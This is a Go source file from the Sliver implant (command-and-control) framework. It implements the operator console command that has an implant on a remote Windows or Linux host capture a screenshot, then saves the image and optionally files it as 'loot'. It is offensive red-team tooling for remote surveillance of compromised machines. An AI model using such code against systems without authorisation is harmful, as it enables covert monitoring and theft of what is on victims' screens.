package screenshot

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"time"

	"github.com/bishopfox/sliver/client/command/loot"
	"github.com/bishopfox/sliver/client/console"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/util"
	"google.golang.org/protobuf/proto"

	"github.com/desertbit/grumble"
)

// ScreenshotCmd - Take a screenshot of the remote system
func ScreenshotCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
	session, beacon := con.ActiveTarget.GetInteractive()
	if session == nil && beacon == nil {
		return
	}

	targetOS := getOS(session, beacon)
	if targetOS != "windows" && targetOS != "linux" {
		con.PrintWarnf("Target platform may not support screenshots!\n")
		return
	}

	screenshot, err := con.Rpc.Screenshot(context.Background(), &sliverpb.ScreenshotReq{
		Request: con.ActiveTarget.Request(ctx),
	})
	if err != nil {
		con.PrintErrorf("%s\n", err)
		return
	}

	hostname := getHostname(session, beacon)
	if screenshot.Response != nil && screenshot.Response.Async {
		con.AddBeaconCallback(screenshot.Response.TaskID, func(task *clientpb.BeaconTask) {
			err = proto.Unmarshal(task.Response, screenshot)
			if err != nil {
				con.PrintErrorf("Failed to decode response %s\n", err)
				return
			}
			PrintScreenshot(screenshot, hostname, ctx, con)
		})
		con.PrintAsyncResponse(screenshot.Response)
	} else {
		PrintScreenshot(screenshot, hostname, ctx, con)
	}
}

// PrintScreenshot - Handle the screenshot command response
func PrintScreenshot(screenshot *sliverpb.Screenshot, hostname string, ctx *grumble.Context, con *console.SliverConsoleClient) {
	timestamp := time.Now().Format("20060102150405")

	saveTo := ctx.Flags.String("save")
	var saveToFile *os.File
	var err error
	if saveTo == "" {
		tmpFileName := filepath.Base(fmt.Sprintf("screenshot_%s_%s_*.png", filepath.Base(hostname), timestamp))
		saveToFile, err = ioutil.TempFile("", tmpFileName)
		if err != nil {
			con.PrintErrorf("%s\n", err)
			return
		}
	} else {
		saveToFile, err = os.OpenFile(saveTo, os.O_WRONLY, 600)
		if err != nil {
			con.PrintErrorf("Error creating file: %s\n", err)
			return
		}
	}
	defer saveToFile.Close()
	var n int
	n, err = saveToFile.Write(screenshot.Data)
	if err != nil {
		con.PrintErrorf("Error writting file: %s\n", err)
		return
	}

	con.PrintInfof("Screenshot written to %s (%s)\n", saveToFile.Name(), util.ByteCountBinary(int64(n)))
	if ctx.Flags.Bool("loot") && 0 < len(screenshot.Data) {
		err = loot.AddLootFile(con.Rpc, fmt.Sprintf("[screenshot] %s", timestamp), saveToFile.Name(), screenshot.Data, false)
		if err != nil {
			con.PrintErrorf("Failed to save output as loot: %s\n", err)
		} else {
			con.PrintInfof("Output saved as loot\n")
		}
	}
}

func getOS(session *clientpb.Session, beacon *clientpb.Beacon) string {
	if session != nil {
		return session.OS
	}
	if beacon != nil {
		return beacon.OS
	}
	panic("no session or beacon")
}

func getHostname(session *clientpb.Session, beacon *clientpb.Beacon) string {
	if session != nil {
		return session.Hostname
	}
	if beacon != nil {
		return beacon.Hostname
	}
	panic("no session or beacon")
}
